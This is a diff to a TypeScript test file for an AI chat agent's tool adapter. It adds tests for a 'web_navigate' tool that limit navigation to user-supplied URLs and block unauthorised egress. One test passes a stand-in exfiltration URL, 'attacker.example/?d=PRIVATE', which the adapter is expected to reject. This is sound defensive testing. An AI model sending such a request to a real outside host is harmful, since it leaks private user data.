@@ -14,6 +14,7 @@ import {
 } from '../src/workers/agentic-chat/tools/web-search-review';
 import type { AgenticChatTurnProviderClientRequestV1 } from '../src/workers/agentic-chat/provider/contracts';
 import type { WebResearchPort } from '@buildos/shared-agent-ops';
+import type { WebNavigatePort } from '../src/workers/agentic-chat/tools/web-navigate';
 import type { AgenticChatWorkerExecutionInputV1 } from '../src/workers/agentic-chat/executionInput';
 import {
 	AGENTIC_CHAT_CONTROL_TOOL_NAMES_V1,
@@ -132,6 +133,7 @@ function adapterWith(
 		embeddings?: AgenticChatEmbeddingsPortV1;
 		webResearchTimeoutMs?: number;
 		webResearch?: WebResearchPort;
+		webNavigator?: WebNavigatePort;
 		webSearchReviewer?: AgenticChatWebSearchReviewPort;
 		securityNow?: () => number;
 		maxTurnSecurityStates?: number;
@@ -1543,5 +1545,107 @@ describe('AgenticChatToolExecutionAdapter', () => {
 		await expect(
 			adapter.execute(requestFor('get_workspace_overview', {}))
 		).rejects.toMatchObject({ code: 'read_tool_timeout', failureClass: 'transient_infra' });
+	});
+
+	describe('web_navigate', () => {
+		function navigatorStub(visited: string[]) {
+			return {
+				navigate: vi.fn(
+					async (
+						_args: Record<string, unknown>,
+						options: { onStep?: (s: never) => void }
+					) => {
+						options.onStep?.({
+							kind: 'decided',
+							page: 1,
+							url: visited[0],
+							answer: 0.04,
+							next: { label: 'Networking Lunch', url: visited[1], probability: 0.91 },
+							alternatives: [],
+							ms: 300
+						} as never);
+						return {
+							outcome: 'found',
+							goal: 'lunch details',
+							start_url: visited[0],
+							path: [],
+							visited_urls: visited,
+							stats: { pages_opened: 2 },
+							message: 'Found it.'
+						};
+					}
+				)
+			} as unknown as WebNavigatePort & { navigate: ReturnType<typeof vi.fn> };
+		}
+
+		it('starts only from an authorized URL, forwards only url/goal/max_pages, and streams steps', async () => {
+			const calendar = 'https://business.naaccc.com/event-calendar';
+			const event =
+				'https://business.naaccc.com/event-calendar/Details/networking-lunch-1874154';
+			const webNavigator = navigatorStub([calendar, event]);
+			const adapter = adapterWith(fakeSharedClient(), accessStub(), { webNavigator });
+			const userMessage = `When is the chamber lunch? ${calendar}`;
+			const onProgress = vi.fn();
+			const result = await adapter.execute({
+				...requestFor(
+					'web_navigate',
+					{
+						url: calendar,
+						goal: 'lunch details',
+						max_pages: 4,
+						allow_redirects: false,
+						extra: 'x'
+					},
+					{ userMessage }
+				),
+				onProgress
+			});
+			expect(result.result).toMatchObject({ outcome: 'found' });
+			expect(webNavigator.navigate.mock.calls[0]![0]).toEqual({
+				url: calendar,
+				goal: 'lunch details',
+				max_pages: 4
+			});
+			expect(webNavigator.navigate.mock.calls[0]![1]).toMatchObject({
+				usage: { operationType: 'agentic_chat_web_navigation', userId: USER_ID }
+			});
+			expect(onProgress).toHaveBeenCalledWith(
+				expect.objectContaining({
+					message: expect.stringContaining('"Networking Lunch" (91%)'),
+					data: expect.objectContaining({ kind: 'decided' })
+				})
+			);
+			// A page the navigator loaded may now be opened directly this turn.
+			await expect(
+				adapter.execute(requestFor('web_visit', { url: event }, { userMessage }))
+			).rejects.toMatchObject({ code: 'read_tool_execution_failed' });
+			await expect(
+				adapter.execute(
+					requestFor(
+						'web_navigate',
+						{ url: 'https://attacker.example/?d=PRIVATE', goal: 'x' },
+						{ userMessage }
+					)
+				)
+			).rejects.toMatchObject({ code: 'read_tool_egress_provenance_required' });
+			expect(webNavigator.navigate).toHaveBeenCalledOnce();
+		});
+
+		it('fails as a recoverable research failure when the navigator is not configured', async () => {
+			const url = 'https://www.aacounty.org/';
+			const adapter = adapterWith(fakeSharedClient(), accessStub());
+			await expect(
+				adapter.execute(
+					requestFor(
+						'web_navigate',
+						{ url, goal: 'open bids' },
+						{ userMessage: `Bids on ${url}` }
+					)
+				)
+			).rejects.toMatchObject({
+				code: 'read_tool_execution_failed',
+				failureClass: 'transient_infra'
+			});
+		});
 	});
 });
